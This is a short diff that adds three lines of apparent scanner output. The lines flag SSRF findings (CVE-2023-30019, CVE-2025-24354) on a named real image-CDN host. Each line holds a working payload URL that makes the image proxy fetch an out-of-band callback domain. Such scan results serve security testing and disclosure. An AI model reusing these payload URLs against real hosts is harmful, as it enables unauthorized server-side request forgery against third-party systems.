@@ -1,0 +1,3 @@
+[CVE-2023-30019] [http] [medium] https://img-cdn-origin-prod.infra.magiceden.io/111/rs:fit:400:400:0:0/plain/http://d8t1g4romj13ejuh5lu0oygdfsss5fekm.oast.pro
+[CVE-2023-30019] [http] [medium] https://img-cdn-origin-prod.infra.magiceden.io/111/rs:fit:400:400:0:0/plain/http://d8t1g4romj13ejuh5lu0oygdfsss5fekm.oast.pro
+[CVE-2025-24354] [http] [medium] https://img-cdn-origin-prod.infra.magiceden.io/unsafe/plain/http://d8t1g4romj13ejuh5lu0soscwetp7sbpi.oast.pro
